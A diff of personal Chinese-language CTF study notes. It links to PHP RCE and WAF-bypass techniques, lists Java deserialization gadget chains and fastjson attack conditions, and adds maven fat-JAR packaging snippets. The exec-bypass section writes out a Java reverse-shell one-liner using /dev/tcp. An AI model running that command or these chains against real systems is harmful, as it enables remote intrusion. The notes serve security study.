@@ -11,6 +11,10 @@ img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%
 
 ---
 
+## ctf平台
+
+ctf复现：https://gz.imxbt.cn/account/login
+
 ## Common-Collections
 
 CC链
@@ -22,6 +26,16 @@ CC链
 RCE绕过preg_match 
 
 https://zhuanlan.zhihu.com/p/392606966
+
+PHP特性绕过WAF函数，如get_defined_vars()
+
+https://www.runoob.com/php/php-variable-handling-functions.html
+
+无字母数字RCE：
+
+https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html#php5shell
+
+https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html
 
 反弹shell绕过
 
@@ -45,7 +59,19 @@ ssti绕过
 
 https://blog.csdn.net/m0_73185293/article/details/131695528
 
+JAVA URLClassLoader过滤了http和file协议可以用jar协议绕过
 
+审代码，看到有读文件，然后根据布尔值来读的，一定要想起竞争！遇到很多次了
+
+### 单参数exec绕过
+
+一般用的是单参数exec
+
+![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240913125109102.png)
+
+https://blog.csdn.net/whatday/article/details/107098353
+
+这篇文章讲了java单参数exec反弹shell应该使用`Runtime.getRuntime().exec("/bin/bash -c $@|bash 0 echo bash -i >&/dev/tcp/127.0.0.1/8888 0>&1");`
 
 
 
@@ -56,6 +82,10 @@ fastjson目标不出网，<=1.2.24下打BCEL，需要回显可以打内存马
 目标出网 ，<=1.2.47，打JNDI
 
 1.2.68+commons-io能写文件
+
+github上有payload项目，我所知的唯一缺少的是fastjson>1.2.36+有h2依赖能打jdbc attack
+
+
 
 
 
@@ -68,6 +98,14 @@ Hessian2反序列化和Kryo、FST反序列化会触发hashMap.put
 compare通常伴随着任意getter调用（因为compare需要逐项取值对比）
 
 BadAttributeValueExpException.readObject -> toString
+
+XString.equals -> toString
+
+HashMap.readObject() -> AbstractMap.equals -> UIDefault$TextAndMnemonicHashMap.get -> toString
+
+EventListenerList.readObject() -> tostring
+
+
 
 (JDK8u65) AnnotationInvocationHandler.invoke -> get
 
@@ -99,6 +137,8 @@ signedObject.getObject -> readObject
 
 JdbcRowSetImpl.setAutoCommit ->  JNDI
 
+(resin) com.caucho.naming.QName#toString -> JNDI
+
 (Tomcat) BasicDataSource.getConnection -> Class.forName
 
 
@@ -111,11 +151,9 @@ JdbcRowSetImpl.setAutoCommit ->  JNDI
 
 (rome) EqualsBean.hashCode -> toString
 
-(spring) XString.equals -> toString
-
 (spring) HashMap.put -> HotSwappableTargetSource.equals -> equals
 
-HashMap、HashSet、HashTable直接传两个一样的值碰撞也能触发equals（见https://godownio.github.io/2024/09/26/rome-lian/#EqualsBeans%E9%93%BE) 
+HashMap、HashSet、HashTable 碰撞也能触发equals（见https://godownio.github.io/2024/09/26/rome-lian/#EqualsBeans%E9%93%BE) 
 
 ```
 HashMap/HashSet/HashTable.readObject
@@ -208,6 +246,119 @@ print(basepoc)
 
 
 ## other骚报错解决
+
+特别坑点：注意yakit发包 ，post的base64数据一定要URL编码呀！
+
+### maven打包问题
+
+经常遇到打包的问题，spring环境下会自动打包lib目录下的依赖，成为fatJAR形式
+
+不是spring项目也能打包成fatJAR
+
+* 生成fatJAR，而且是深度耦合，意思是会把依赖全部解压后放到jar中
+
+```xml
+            <!-- 使用 maven-assembly-plugin -->
+<!--            打包所有依赖到jar,并且是文件夹级别的深耦合,生成jar-with-dependencies-->
+            <plugin>
+                <groupId>org.apache.maven.plugins</groupId>
+                <artifactId>maven-assembly-plugin</artifactId>
+                <version>3.6.0</version>
+                <configuration>
+                    <descriptorRefs>
+                        <descriptorRef>jar-with-dependencies</descriptorRef>
+                    </descriptorRefs>
+                    <!-- 不指定 mainClass -->
+                    <archive>
+                        <manifest>
+                            <addClasspath>true</addClasspath>
+                        </manifest>
+                    </archive>
+                </configuration>
+                <executions>
+                    <execution>
+                        <phase>package</phase>
+                        <goals>
+                            <goal>single</goal>
+                        </goals>
+                    </execution>
+                </executions>
+            </plugin>
+```
+
+如果不需要解压，想把源代码的lib目录下的依赖放到jar的lib目录下，而不解压，可用以下方式：
+
+* 先把依赖全部复制到源代码lib目录，然后用assembly.xml打包
+
+```xml
+			<plugin>
+                <groupId>org.apache.maven.plugins</groupId>
+                <artifactId>maven-dependency-plugin</artifactId>
+                <version>3.5.0</version>
+                <executions>
+                    <execution>
+                        <id>copy-dependencies</id>
+                        <phase>package</phase>
+                        <goals>
+                            <goal>copy-dependencies</goal>
+                        </goals>
+                        <configuration>
+                            <outputDirectory>${project.basedir}/lib</outputDirectory>
+                            <includeScope>runtime</includeScope>
+                        </configuration>
+                    </execution>
+                </executions>
+            </plugin>
+            <plugin>
+                <groupId>org.apache.maven.plugins</groupId>
+                <artifactId>maven-assembly-plugin</artifactId>
+                <version>3.6.0</version>
+                <executions>
+                    <execution>
+                        <id>make-jar-with-lib</id>
+                        <phase>package</phase>
+                        <goals>
+                            <goal>single</goal>
+                        </goals>
+                        <configuration>
+                            <descriptors>
+                                <descriptor>assembly.xml</descriptor>
+                            </descriptors>
+                        </configuration>
+                    </execution>
+                </executions>
+            </plugin>
+```
+
+assembly.xml：
+
+```xml
+<assembly xmlns="http://maven.apache.org/ASSEMBLY/2.0.0"
+          xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+          xsi:schemaLocation="http://maven.apache.org/ASSEMBLY/2.0.0
+          http://maven.apache.org/xsd/assembly-2.0.0.xsd">
+    <id>jar-with-lib</id>
+    <formats>
+        <format>jar</format>
+    </formats>
+    <includeBaseDirectory>false</includeBaseDirectory>
+    <fileSets>
+        <!-- 1. 包含 class 文件 -->
+        <fileSet>
+            <directory>${project.build.outputDirectory}</directory>
+            <outputDirectory>/</outputDirectory>
+        </fileSet>
+
+        <!-- 2. 包含 lib 目录 -->
+        <fileSet>
+            <directory>${project.basedir}/lib</directory>
+            <outputDirectory>/lib</outputDirectory>
+        </fileSet>
+    </fileSets>
+</assembly>
+```
+
+### paython传参问题
 
 request.form.get()是接收POST表单，且表单的Content-Type是application/x-www-form-urlencoded（好像还能接收一个），反正不能是application/json
 
